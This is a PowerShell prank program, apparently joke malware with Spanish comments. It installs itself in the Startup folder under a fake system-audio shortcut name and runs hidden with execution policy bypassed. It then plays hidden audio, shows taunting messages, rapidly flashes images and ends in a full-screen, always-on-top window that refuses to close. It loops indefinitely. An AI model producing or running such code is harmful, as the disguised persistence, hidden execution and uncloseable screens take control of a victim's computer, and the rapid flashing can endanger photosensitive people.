#--------------------------------------------------------------------
# SCRIPT: yupilof.ps1 (Vibra lento + Suerte se detiene a los 7:15)
#--------------------------------------------------------------------

function Configurar-ArranqueAutomatico {
    $directorioActual = $PSScriptRoot
    $carpetaInicio = [Environment]::GetFolderPath('Startup')
    $nombreAccesoDirecto = "SystemCoreAudio.lnk"
    $rutaAccesoDirecto = Join-Path $carpetaInicio $nombreAccesoDirecto
    if (-not (Test-Path $rutaAccesoDirecto)) {
        $shell = New-Object -ComObject WScript.Shell
        $shortcut = $shell.CreateShortcut($rutaAccesoDirecto)
        $shortcut.TargetPath = "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
        $shortcut.Arguments = "-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$directorioActual\yupilof.ps1`""
        $shortcut.WorkingDirectory = $directorioActual
        $shortcut.Description = "Servicio de audio principal del sistema"
        $shortcut.Save()
    }
}
Configurar-ArranqueAutomatico

Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

$global:reproductoresDeAudio = New-Object System.Collections.ArrayList
function Reproducir-AudioInvisible {
    param ($rutaAudio, [switch]$NoLoop)
    try {
        $wmp = New-Object -ComObject WMPlayer.OCX; $wmp.URL = $rutaAudio
        if ($NoLoop) { $wmp.settings.setMode("loop", $false) }
        else { $wmp.settings.setMode("loop", $true) }
        $wmp.controls.play()
        $global:reproductoresDeAudio.Add($wmp) | Out-Null
        return $wmp
    } catch { return $null }
}

$startTime = [datetime]::Now
$flags = @{
    tortugasLanzadas = $false; cuadraditosLanzados = $false; cuadroInterfazLanzado = $false;
    preguntaLanzada = $false; audio1Detenido = $false; mintimeLanzado = $false; audio2Detenido = $false;
    finalLanzado = $false; granEvento615 = $false; vibraLanzado = $false; finalTotal = $false
}

# Variables Visuales
$anchoPantalla = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width
$altoPantalla = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height

# Interfaz
$form_interfaz = $null; $pictureBox_interfaz = $null; $imagenActual = "interfaz1.jpg"; $lastImageChangeTime = [datetime]::Now

# Final Insano (10 min)
$form_finalTotal = $null; $lastFinalChangeTime = [datetime]::Now; $finalIndex = 1
$imgFI1 = $null; if (Test-Path (Join-Path $PSScriptRoot "finalinsano1.png")) { $imgFI1 = [System.Drawing.Image]::FromFile((Join-Path $PSScriptRoot "finalinsano1.png")) }
$imgFI2 = $null; if (Test-Path (Join-Path $PSScriptRoot "finalinsano2.png")) { $imgFI2 = [System.Drawing.Image]::FromFile((Join-Path $PSScriptRoot "finalinsano2.png")) }

# Fondo Caótico (Grises y Vibra)
$form_fondo = $null; $lastFondoChangeTime = [datetime]::Now
$vibraImages = New-Object System.Collections.ArrayList
foreach ($v in @("vibra1.png", "vibra2.png", "vibra3.png")) {
    $p = Join-Path $PSScriptRoot $v; if (Test-Path $p) { $vibraImages.Add([System.Drawing.Image]::FromFile($p)) }
}
$vibraIndex = 0
$labels_2bad = New-Object System.Collections.ArrayList; $last2badToggleTime = [datetime]::Now

# Suerte (Ej)
$form_ej = $null; $pictureBox_ej = $null; $imagenActualEj = "ej1.png"; $lastEjChangeTime = [datetime]::Now
$ej_x = 50; $ej_y = 50; $ej_dx = 1; $ej_dy = 1 

# --- EVENTO 0:00 ---
$reproductor_joseluis1 = Reproducir-AudioInvisible (Join-Path $PSScriptRoot "joseluis.mp3")
$reproductor_joseluis2 = $null
$form_estado = New-Object System.Windows.Forms.Form; $form_estado.StartPosition = 'Manual'; $form_estado.TopMost = $true; $form_estado.FormBorderStyle = 'None'; $form_estado.BackColor = 'Red'; $form_estado.ShowInTaskbar = $false; $form_estado.Size = New-Object System.Drawing.Size(300, 50); $form_estado.Location = New-Object System.Drawing.Point(20, 20)
$label_estado = New-Object System.Windows.Forms.Label; $label_estado.Size = $form_estado.Size; $label_estado.TextAlign = 'MiddleCenter'; $label_estado.ForeColor = 'Black'; $label_estado.Text = "Estado: funcional"; $label_estado.Font = New-Object System.Drawing.Font("Arial", 12, [System.Drawing.FontStyle]::Bold)
$form_estado.Controls.Add($label_estado); $form_estado.Show()

$tortugas = New-Object System.Collections.ArrayList
$imgAmor = [System.Drawing.Image]::FromFile((Join-Path $PSScriptRoot "tortuamor.png"))
$imgRizzOriginal = [System.Drawing.Image]::FromFile((Join-Path $PSScriptRoot "turturizz.png"))
$nuevoAncho = $imgAmor.Width * 2; $nuevaAltura = $imgAmor.Height * 2
$imgRizz = New-Object System.Drawing.Bitmap($nuevoAncho, $nuevaAltura); $graphics = [System.Drawing.Graphics]::FromImage($imgRizz); $graphics.DrawImage($imgRizzOriginal, 0, 0, $nuevoAncho, $nuevaAltura)
for ($i = 0; $i -lt 6; $i++) {
    $imagen = if ($i -lt 3) { $imgAmor } else { $imgRizz }; $tortuga = [PSCustomObject]@{ form = $null; img = $imagen; x = Get-Random -Maximum ($anchoPantalla - $imagen.Width); y = Get-Random -Maximum ($altoPantalla - $imagen.Height); dx = Get-Random -Minimum 2 -Maximum 5; dy = Get-Random -Minimum 2 -Maximum 5 }
    $tortugas.Add($tortuga) | Out-Null
}

while ($true) {
    $elapsedSeconds = ([datetime]::Now - $startTime).TotalSeconds

    # --- EVENTOS 1:00 a 4:00 ---
    if ($elapsedSeconds -ge 60 -and !$flags.granEvento615) {
        foreach ($t in $tortugas) {
            if ($t.form -eq $null -or $t.form.IsDisposed) { $t.form = New-Object System.Windows.Forms.Form; $t.form.FormBorderStyle = 'None'; $t.form.BackgroundImage = $t.img; $t.form.Size = $t.img.Size; $t.form.StartPosition = 'Manual'; $t.form.TopMost = $true; $t.form.ShowInTaskbar = $false; $t.form.Show() }
            $t.x += $t.dx; $t.y += $t.dy; if ($t.x -le 0 -or ($t.x + $t.img.Width) -ge $anchoPantalla) { $t.dx *= -1 }; if ($t.y -le 0 -or ($t.y + $t.img.Height) -ge $altoPantalla) { $t.dy *= -1 }; $t.form.Location = New-Object System.Drawing.Point($t.x, $t.y)
        }
    }
    if ($elapsedSeconds -ge 120 -and !$flags.cuadraditosLanzados) {
        $flags.cuadraditosLanzados = $true; $form_cuadraditos = New-Object System.Windows.Forms.Form; $form_cuadraditos.StartPosition = 'CenterScreen'; $form_cuadraditos.TopMost = $true; $form_cuadraditos.FormBorderStyle = 'None'; $form_cuadraditos.BackColor = 'Black'; $form_cuadraditos.ShowInTaskbar = $false; $form_cuadraditos.Size = New-Object System.Drawing.Size(500, 300); $form_cuadraditos.add_FormClosing({ param($s, $e); $e.Cancel = $true }); $colores = @([System.Drawing.Color]::Red, [System.Drawing.Color]::Blue, [System.Drawing.Color]::Green, [System.Drawing.Color]::Yellow, [System.Drawing.Color]::Purple, [System.Drawing.Color]::LimeGreen, [System.Drawing.Color]::Magenta); for ($i = 0; $i -lt 30; $i++) { $cuadradito = New-Object System.Windows.Forms.PictureBox; $cuadradito.Size = New-Object System.Drawing.Size((Get-Random -Minimum 20 -Maximum 50), (Get-Random -Minimum 20 -Maximum 50)); $cuadradito.BackColor = $colores[(Get-Random -Maximum $colores.Count)]; $xPosCuadradito = Get-Random -Maximum ($form_cuadraditos.Width - $cuadradito.Width); $yPosCuadradito = Get-Random -Maximum ($form_cuadraditos.Height - $cuadradito.Height); $cuadradito.Location = New-Object System.Drawing.Point($xPosCuadradito, $yPosCuadradito); $form_cuadraditos.Controls.Add($cuadradito) }; $form_cuadraditos.Show()
    }
    if ($elapsedSeconds -ge 210 -and !$flags.audio1Detenido) { $flags.audio1Detenido = $true; if ($reproductor_joseluis1 -ne $null) { $reproductor_joseluis1.controls.stop() } }
    if ($elapsedSeconds -ge 210 -and !$flags.mintimeLanzado) { $flags.mintimeLanzado = $true; Reproducir-AudioInvisible (Join-Path $PSScriptRoot "mintime.mp3") -NoLoop }
    
    if ($elapsedSeconds -ge 240 -and !$flags.preguntaLanzada) {
        $flags.preguntaLanzada = $true; $reproductor_joseluis2 = Reproducir-AudioInvisible (Join-Path $PSScriptRoot "joseluis2.mp3"); [System.Windows.Forms.MessageBox]::Show("¿Estás listo para ver algo muy lindo?", "Pregunta", "OK", "Question")
        $flags.cuadroInterfazLanzado = $true; $cuadroAncho = [int]($anchoPantalla / 3); $cuadroAlto = [int]($altoPantalla / 3); $form_interfaz = New-Object System.Windows.Forms.Form; $form_interfaz.FormBorderStyle = 'None'; $form_interfaz.StartPosition = 'Manual'; $form_interfaz.TopMost = $true; $form_interfaz.ShowInTaskbar = $false; $form_interfaz.Size = New-Object System.Drawing.Size($cuadroAncho, $cuadroAlto); $xPos = ([int](($anchoPantalla - $cuadroAncho) / 2)); $yPos = ([int](($altoPantalla - $cuadroAlto) / 2)); $form_interfaz.Location = New-Object System.Drawing.Point($xPos, $yPos); $pictureBox_interfaz = New-Object System.Windows.Forms.PictureBox; $pictureBox_interfaz.Dock = 'Fill'; $pictureBox_interfaz.SizeMode = [System.Windows.Forms.PictureBoxSizeMode]::StretchImage; $currentImagePath = (Join-Path $PSScriptRoot $imagenActual); if (Test-Path $currentImagePath) { $pictureBox_interfaz.Image = [System.Drawing.Image]::FromFile($currentImagePath) }; $form_interfaz.Controls.Add($pictureBox_interfaz); $form_interfaz.Show()
    }
    if ($flags.cuadroInterfazLanzado -and !$flags.granEvento615 -and ([datetime]::Now - $lastImageChangeTime).TotalSeconds -ge 0.5) { $lastImageChangeTime = [datetime]::Now; if ($imagenActual -eq "interfaz1.jpg") { $imagenActual = "interfaz2.jpg" } else { $imagenActual = "interfaz1.jpg" }; $newImagePath = (Join-Path $PSScriptRoot $imagenActual); if (Test-Path $newImagePath) { if ($pictureBox_interfaz.Image) { $pictureBox_interfaz.Image.Dispose() }; $pictureBox_interfaz.Image = [System.Drawing.Image]::FromFile($newImagePath) } }

    # --- EVENTO 5:00 ---
    if ($elapsedSeconds -ge 300 -and !$flags.finalLanzado) {
        $flags.finalLanzado = $true; $form_final = New-Object System.Windows.Forms.Form; $form_final.StartPosition = 'CenterScreen'; $form_final.TopMost = $true; $form_final.FormBorderStyle = 'None'; $form_final.BackColor = 'Black'; $form_final.ShowInTaskbar = $false; $form_final.Size = New-Object System.Drawing.Size(700, 100); $label_final = New-Object System.Windows.Forms.Label; $label_final.Size = $form_final.Size; $label_final.TextAlign = 'MiddleCenter'; $label_final.ForeColor = 'Red'; $label_final.Text = "Oh no, ya no hay tiempo... SERÁS TORTUGIZADO"; $label_final.Font = New-Object System.Drawing.Font("Arial", 18, [System.Drawing.FontStyle]::Bold); $form_final.Controls.Add($label_final); $form_final.Show()
    }

    # --- EVENTO 6:15 (Comienza Grises + Suerte + Texto) ---
    if ($elapsedSeconds -ge 375 -and !$flags.granEvento615) {
        $flags.granEvento615 = $true
        # Cerrar lo anterior
        if ($form_estado) {$form_estado.Close()}; if ($form_cuadraditos) {$form_cuadraditos.Close()}; if ($form_interfaz) {$form_interfaz.Close()}; if ($form_final) {$form_final.Close()}
        foreach($t in $tortugas) {if($t.form) {$t.form.Close()}}
        
        # Iniciar Fondo
        $form_fondo = New-Object System.Windows.Forms.Form; $form_fondo.FormBorderStyle = 'None'; $form_fondo.WindowState = 'Maximized'; $form_fondo.TopMost = $true; $form_fondo.ShowInTaskbar = $false; $form_fondo.add_FormClosing({ param($s, $e); $e.Cancel = $true }); $form_fondo.BackgroundImageLayout = 'Stretch'; $form_fondo.Show()
        
        # Texto 2bad
        for ($i = 0; $i -lt 250; $i++) {
            $label = New-Object System.Windows.Forms.Label; $label.Text = "2 bad so sad"; $label.AutoSize = $true; $label.Font = New-Object System.Drawing.Font("Courier New", 10, [System.Drawing.FontStyle]::Bold); $label.ForeColor = 'White'; $label.BackColor = 'Transparent'
            $xPos = Get-Random -Maximum ($anchoPantalla - 100); $yPos = Get-Random -Maximum ($altoPantalla - 20); $label.Location = New-Object System.Drawing.Point($xPos, $yPos)
            $form_fondo.Controls.Add($label); $labels_2bad.Add($label) | Out-Null
        }

        # Iniciar Ventana Suerte
        $ejAncho = [int]($anchoPantalla * 0.8); $ejAlto = [int]($altoPantalla * 0.8)
        $form_ej = New-Object System.Windows.Forms.Form; $form_ej.FormBorderStyle = 'None'; $form_ej.StartPosition = 'Manual'; $form_ej.TopMost = $true; $form_ej.ShowInTaskbar = $false; $form_ej.BackColor = 'Black'; $form_ej.Size = New-Object System.Drawing.Size($ejAncho, $ejAlto)
        $label_suerte = New-Object System.Windows.Forms.Label; $label_suerte.Dock = 'Top'; $label_suerte.Height = 50; $label_suerte.TextAlign = 'MiddleCenter'; $label_suerte.Font = New-Object System.Drawing.Font("Arial", 24, [System.Drawing.FontStyle]::Bold); $label_suerte.ForeColor = 'White'; $label_suerte.Text = "Suerte"
        $pictureBox_ej = New-Object System.Windows.Forms.PictureBox; $pictureBox_ej.Dock = 'Fill'; $pictureBox_ej.SizeMode = [System.Windows.Forms.PictureBoxSizeMode]::Zoom
        $form_ej.Controls.Add($pictureBox_ej); $form_ej.Controls.Add($label_suerte); $form_ej.Show()
    }

    # --- EVENTO 7:15 (Cambio a Vibra + Detener Suerte) ---
    if ($elapsedSeconds -ge 435 -and !$flags.vibraLanzado) {
        $flags.vibraLanzado = $true
        # CERRAR VENTANA SUERTE
        if ($form_ej) { $form_ej.Close() }
    }

    # Lógica 6:15 - 10:00 (Fondo, Texto, Movimiento Suerte si aplica)
    if ($flags.granEvento615 -and !$flags.finalTotal) {
        # Fondo
        $intervaloVibra = if ($flags.vibraLanzado) { 0.75 } else { 0.10 } # 0.10 para grises, 0.75 para vibra
        if (([datetime]::Now - $lastFondoChangeTime).TotalSeconds -ge $intervaloVibra) {
            $lastFondoChangeTime = [datetime]::Now
            if (!$flags.vibraLanzado) {
                # MODO GRISES (6:15 - 7:15)
                $grayValue = Get-Random -Minimum 10 -Maximum 100
                $form_fondo.BackColor = [System.Drawing.Color]::FromArgb($grayValue, $grayValue, $grayValue)
                $form_fondo.BackgroundImage = $null
            } else {
                # MODO VIBRA (7:15 - 10:00)
                if ($vibraImages.Count -gt 0) {
                    $vibraIndex = ($vibraIndex + 1) % $vibraImages.Count
                    $form_fondo.BackgroundImage = $vibraImages[$vibraIndex]
                }
            }
        }
        # Texto 2bad (Parpadeo constante)
        if (([datetime]::Now - $last2badToggleTime).TotalSeconds -ge 0.2) {
            $last2badToggleTime = [datetime]::Now; foreach ($label in $labels_2bad) { $label.Visible = !$label.Visible }
        }
        
        # Movimiento Suerte (SOLO SI NO ES VIBRA)
        if (!$flags.vibraLanzado) {
            $ej_x += $ej_dx; $ej_y += $ej_dy
            if ($ej_x -le 0 -or ($ej_x + $form_ej.Width) -ge $anchoPantalla) { $ej_dx *= -1 }
            if ($ej_y -le 0 -or ($ej_y + $form_ej.Height) -ge $altoPantalla) { $ej_dy *= -1 }
            if ($form_ej) { $form_ej.Location = New-Object System.Drawing.Point($ej_x, $ej_y) }
            
            if (([datetime]::Now - $lastEjChangeTime).TotalSeconds -ge 0.25) {
                $lastEjChangeTime = [datetime]::Now
                if ($imagenActualEj -eq "ej1.png") { $imagenActualEj = "ej2.png" } else { $imagenActualEj = "ej1.png" }
                $newEjPath = (Join-Path $PSScriptRoot $imagenActualEj); if (Test-Path $newEjPath) { if ($pictureBox_ej.Image) { $pictureBox_ej.Image.Dispose() }; $pictureBox_ej.Image = [System.Drawing.Image]::FromFile($newEjPath) }
            }
        }
    }

    # --- EVENTO 10:00 (CIERRE TOTAL + FINAL INSANO) ---
    if ($elapsedSeconds -ge 600 -and !$flags.finalTotal) {
        $flags.finalTotal = $true
        
        # CERRAR TODO (Fondo, textos)
        if ($form_fondo) { $form_fondo.Close() }
        
        # Audio
        if ($reproductor_joseluis2 -ne $null) { $reproductor_joseluis2.controls.stop() }
        Reproducir-AudioInvisible (Join-Path $PSScriptRoot "great_work.mp3")

        # Iniciar Pantalla Final Insana
        $form_finalTotal = New-Object System.Windows.Forms.Form
        $form_finalTotal.FormBorderStyle = 'None'; $form_finalTotal.WindowState = 'Maximized'; $form_finalTotal.TopMost = $true; $form_finalTotal.ShowInTaskbar = $false
        $form_finalTotal.add_FormClosing({ param($s, $e); $e.Cancel = $true })
        $form_finalTotal.BackgroundImageLayout = 'Stretch'
        $form_finalTotal.Show()
    }

    # Lógica Final Insano (10:00 en adelante)
    if ($flags.finalTotal) {
        if (([datetime]::Now - $lastFinalChangeTime).TotalSeconds -ge 0.2) {
            $lastFinalChangeTime = [datetime]::Now
            if ($finalIndex -eq 1) { 
                $finalIndex = 2; $currImg = $imgFI2 
            } else { 
                $finalIndex = 1; $currImg = $imgFI1 
            }
            if ($currImg) { $form_finalTotal.BackgroundImage = $currImg }
        }
    }

    [System.Windows.Forms.Application]::DoEvents(); Start-Sleep -Milliseconds 50
}